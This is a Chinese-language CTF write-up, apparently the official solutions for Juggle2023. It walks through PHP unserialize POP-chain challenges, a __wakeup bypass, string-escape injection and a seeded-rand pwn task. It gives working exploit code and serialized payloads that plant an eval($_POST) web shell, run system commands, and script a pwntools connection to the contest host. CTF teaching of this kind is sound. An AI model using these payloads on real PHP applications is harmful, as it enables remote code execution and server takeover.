class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to 1z_unserv&#x27;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> timo;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> timo;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">gets</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">gets</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">diki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$evil</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https：//www.dikio3o.top&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">gets</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$po</span> = <span class="variable language_">$this</span>-&gt;evil;</span><br><span class="line">      <span class="variable">$po</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>先给出payload：</p>
<p>这个exp是根据题目自行构造的至于什么是exp，poc，payload··· 这些可以看下这篇[POC、EXP、Payload的区别 - 知乎 (zhihu.com)](https：&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;627027758#：~：text&#x3D;POC、EXP、Payload的区别 POC：全称 ‘ Proof of Concept ‘，中文 ‘’，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。 Payload：中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。) 想了解的可以自行百度。。</p>
<p>exp.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;QLTHNDT&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">diki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$evil</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https：//www.dikio3o.top&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;eval($_POST[1])&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> crz;</span><br><span class="line"><span class="variable">$b</span>-&gt;impo=<span class="keyword">new</span> diki;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O：<span class="number">3</span>：<span class="string">&quot;crz&quot;</span>：<span class="number">3</span>：&#123;s：<span class="number">4</span>：<span class="string">&quot;impo&quot;</span>;O：<span class="number">4</span>：<span class="string">&quot;diki&quot;</span>：<span class="number">3</span>：&#123;s：<span class="number">4</span>：<span class="string">&quot;evil&quot;</span>;s：<span class="number">6</span>：<span class="string">&quot;assert&quot;</span>;s：<span class="number">3</span>：<span class="string">&quot;url&quot;</span>;s：<span class="number">23</span>：<span class="string">&quot;https：//www.dikio3o.top&quot;</span>;s：<span class="number">3</span>：<span class="string">&quot;var&quot;</span>;s：<span class="number">15</span>：<span class="string">&quot;eval(<span class="subst">$_POST</span>[1])&quot;</span>;&#125;s：<span class="number">4</span>：<span class="string">&quot;md51&quot;</span>;s：<span class="number">9</span>：<span class="string">&quot;240610708&quot;</span>;s：<span class="number">4</span>：<span class="string">&quot;md52&quot;</span>;s：<span class="number">7</span>：<span class="string">&quot;QLTHNDT&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">这里有个小知识点`__wakeup`这个魔术方法O：<span class="number">3</span>：<span class="string">&quot;crz&quot;</span>：<span class="number">3</span>：中的<span class="number">3</span>要改成<span class="number">4</span>  <span class="string">&#x27;3&#x27;</span> =&gt; <span class="string">&#x27;4&#x27;</span> 绕过wakeup php7.x之前的wakeup版本漏洞如果还是不懂的可以搜一下cve-<span class="number">2016</span>-<span class="number">7124</span>或者wakeup反序列化漏洞会有更详细的说明.</span><br><span class="line"></span><br><span class="line">O：<span class="number">3</span>：<span class="string">&quot;crz&quot;</span>：<span class="number">4</span>：&#123;s：<span class="number">4</span>：<span class="string">&quot;impo&quot;</span>;O：<span class="number">4</span>：<span class="string">&quot;diki&quot;</span>：<span class="number">3</span>：&#123;s：<span class="number">4</span>：<span class="string">&quot;evil&quot;</span>;s：<span class="number">6</span>：<span class="string">&quot;assert&quot;</span>;s：<span class="number">3</span>：<span class="string">&quot;url&quot;</span>;s：<span class="number">23</span>：<span class="string">&quot;https：//www.dikio3o.top&quot;</span>;s：<span class="number">3</span>：<span class="string">&quot;var&quot;</span>;s：<span class="number">15</span>：<span class="string">&quot;eval(<span class="subst">$_POST</span>[1])&quot;</span>;&#125;s：<span class="number">4</span>：<span class="string">&quot;md51&quot;</span>;s：<span class="number">9</span>：<span class="string">&quot;240610708&quot;</span>;s：<span class="number">4</span>：<span class="string">&quot;md52&quot;</span>;s：<span class="number">7</span>：<span class="string">&quot;QLTHNDT&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<p>我们可以从题目开始分析首先我们知道题目构建了3个类<code>timo``crz``diki</code>做题思路就是有<code>flag</code>先找<code>flag</code>没有的话就考虑<code>rce</code>先去了解题目中 <code>魔法函数的触发条件</code>例如wakeup等 题目一开始就要我们传入<code>pop</code>并且直接就反序列化了说明我们传入pop后第一个触发的就是<code>wakeup</code>了然后接着找，没看到能直接<code>getflag</code>的地方，那百分之八九十是rce了，这时候就要找入口了，可以看到题目中有非常明显的evil，然后看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$po</span> = <span class="variable language_">$this</span>-&gt;evil;</span><br><span class="line"><span class="variable">$po</span>(<span class="variable language_">$this</span>-<span class="keyword">var</span>);</span><br></pre></td></tr></table></figure>



<p>这里就其实非常明显的是，这里还有一个知识点，eval是语言构造器，并不是一个函数..<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14704975.html">关于一句话中使用的assert和eval - Article_kelp - 博客园 (cnblogs.com)</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$po</span> = <span class="variable language_">$this</span>-&gt;evil; <span class="comment">// assert</span></span><br><span class="line"><span class="variable">$po</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);  <span class="comment">//assert(eval($_POST[1]));</span></span><br></pre></td></tr></table></figure>



<p>那么我们应该怎么才能<code>getshell</code>呢？ 要shell必须要使用这个<code>gets()</code>函数，而这个函数在<code>crz</code>这个类里触发了，<code>timo</code>这个类并没有什么用，我们可以先丢一边，可以先传一下验证是否可以通。如果通了，那么我们的逻辑就是正确的，传入pop后会触发<code>crz类</code>的 <code>construct</code>魔法函数然后脚本执行完成后触发<code>destruct</code>，然后被当成字符串，这时候触发<code>toString</code>这个方法，然后这里边规定了md5的值相等，值不相等，就会返回<code>impo</code>这个属性里的<code>gets</code>函数，可是这个函数在<code>crz</code>这里没有，而<code>diki</code>这个类里可以调用，那么我们只需要构造好若比较，并且把他传到<code>diki</code>这个类里，然后序列化即可。</p>
<p>那我们的pop链第一步只需要绕过wakeup就很简单啦。</p>
<p>crz.__construct() -&gt; crz.__destruct() -&gt; crz.__toString() -&gt; diki.__gets()</p>
<p>然后就是正常的rce了</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img15.png" alt="15"></p>
<h5 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：php反序列化rce 反序列化逃逸</span><br></pre></td></tr></table></figure>



<p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lueluelue</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;star&quot;</span><span class="string">&quot;stars&quot;</span><span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF_door</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $home$key$win<span class="variable">$point</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$go</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;home=<span class="variable">$go</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;CTF_door&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;point=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;win));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!I think you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">all_in</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$all</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;all-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">importantPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$startrats</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trans</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;startrats=<span class="variable language_">$this</span>-&gt;trans;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;start);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cracker</span>=<span class="variable">$_POST</span>[<span class="string">&quot;hacker&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cracker</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$hacker</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">CTF_door</span>(<span class="variable">$cracker</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">lueluelue</span>(<span class="variable">$hacker</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个题目乍一看很难仔细一看好像也不是很简单…我们先从传参点进行分析<code>hacker</code>这个点可控post传入<code>cracker</code>后，<code>hacker</code>会new一个类CTF_door然后实例化<code>cracker</code>这个对象<code>lueluelue</code>这个函数是被str_replace的所以其实和直接str_replace 效果是一样的…只不过这里被我做了简单的替换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lueluelue</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;star&quot;</span><span class="string">&quot;stars&quot;</span><span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;star&quot;</span><span class="string">&quot;stars&quot;</span><span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 效果是一样的</span></span><br></pre></td></tr></table></figure>



<p>我们只需要在原本题目做一些修改进行测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cracker</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$hacker</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">CTF_door</span>(<span class="variable">$cracker</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$hacker</span>; <span class="comment">// 输出测试</span></span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">lueluelue</span>(<span class="variable">$hacker</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目里替换<code>star</code>为<code>stars</code>，很明显的字符串增多然后再进行反序列化，如果我们此时传入<code>diki</code>，此时的<code>hacker</code>应该是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O：<span class="number">8</span>：<span class="string">&quot;CTF_door&quot;</span>：<span class="number">4</span>：&#123;s：<span class="number">4</span>：<span class="string">&quot;home&quot;</span>;s：<span class="number">4</span>：<span class="string">&quot;diki&quot;</span>;s：<span class="number">3</span>：<span class="string">&quot;key&quot;</span>;N;s：<span class="number">3</span>：<span class="string">&quot;win&quot;</span>;N;s：<span class="number">5</span>：<span class="string">&quot;point&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>其中的<code>diki</code>则是我们传入的可控的参数. 这里解决了那就是开始代码审计了</p>
<p>从可以rce的地方往后推 类<code>evil</code>-&gt;类<code>all_in</code>-&gt;类<code>importantPoint</code>-&gt;类<code>CTF_door</code> 点找到了我们直接把他倒回来就可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_door-&gt;importantPoint-&gt;all_in-&gt;evil</span><br></pre></td></tr></table></figure>

<p>字符串逃逸不理解什么是字符串逃逸的可以看这篇-&gt;<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1TH4y1U7tJ?p=12&spm_id_from=333.880.my_history.page.click">字符串逃逸增多</a> 我们通过变量<code>$win</code>构造字符串<del>–然后把这后面一部分逃逸掉–</del></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O：8：&quot;CTF_door&quot;：4：&#123;s：4：&quot;home&quot;;s：4：&quot;构造的可控内容<span class="tag">&lt;<span class="name">del</span>&gt;</span>&quot;;s：3：&quot;key&quot;;N;s：3：&quot;win&quot;;N;s：5：&quot;point&quot;;N;&#125;<span class="tag">&lt;/<span class="name">del</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">all_in</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$all</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">importantPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$startrats</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trans</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;system(&quot;cat /fl4g&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> importantPoint;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> all_in;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span>-&gt;start=&amp;<span class="variable">$a</span>-&gt;startrats;</span><br><span class="line"><span class="variable">$a</span>-&gt;trans=<span class="keyword">new</span> all_in;</span><br><span class="line"><span class="variable">$a</span>-&gt;trans-&gt;all=<span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$win</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#echo $win;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;&quot;;s：3：&quot;key&quot;;s：8：&quot;CTF_door&quot;;s：3：&quot;win&quot;;s：&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$win</span>).<span class="string">&#x27;：&quot;&#x27;</span>.<span class="variable">$win</span>.<span class="string">&#x27;&quot;;s：5：&quot;point&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo strlen($data);</span></span><br><span class="line"><span class="variable">$star</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$star</span>.=<span class="string">&#x27;star&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$star</span>.<span class="variable">$data</span>;</span><br><span class="line"><span class="comment">#echo strlen($data);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们必须要先输出变量<code>$win</code>，才能构造后边的字符串，然后这里有个小知识点<code>&amp;</code>的引用传递，和<code>clone</code>不同，<code>&amp;</code>是同一块内存地址，而<code>clone</code>是重新开辟一块地址。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">starstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstarstar&quot;;s：3：&quot;key&quot;;s：8：&quot;CTF_door&quot;;s：3：&quot;win&quot;;s：204：&quot;TzoxNDoiaW1wb3J0YW50UG9pbnQiOjM6e3M6NToic3RhcnQiO047czo5OiJzdGFydHJhdHMiO1I6MjtzOjU6InRyYW5zIjtPOjY6ImFsbF9pbiI6MTp7czozOiJhbGwiO086NDoiZXZpbCI6MTp7czozOiJjbWQiO3M6MjA6InN5c3RlbSgiY2F0IC9mbDRnIik7Ijt9fX0=&quot;;s：5：&quot;point&quot;;N;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><code>PWN由于校内并没有这个方向的选手(题也是我找校外师傅要的0.0)，所以如果感兴趣的话请自行钻研，以下为校内选手的wp。</code></p>
<h5 id="easy-guess"><a href="#easy-guess" class="headerlink" title="easy_guess"></a>easy_guess</h5><p>需要猜对10次，即可得到shell。随机数种子知道是10，利用ctypes库生成随机数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;dikio3o.top&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;33951&#x27;</span></span><br><span class="line">r = remote(ip,port)</span><br><span class="line"></span><br><span class="line">elf = ctypes.cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf.srand(<span class="number">10</span>) <span class="comment">#可写可不写，因为默认就是1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(elf.rand() % <span class="number">100</span>)</span><br><span class="line">    r.sendline(num)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="test-nc"><a href="#test-nc" class="headerlink" title="test-nc"></a>test-nc</h5><p>在linux中使用nc直接连上使用<code>linux</code>命令即可 在windows做的话得自己手动装</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/rrr.png" alt="rrr"></p>
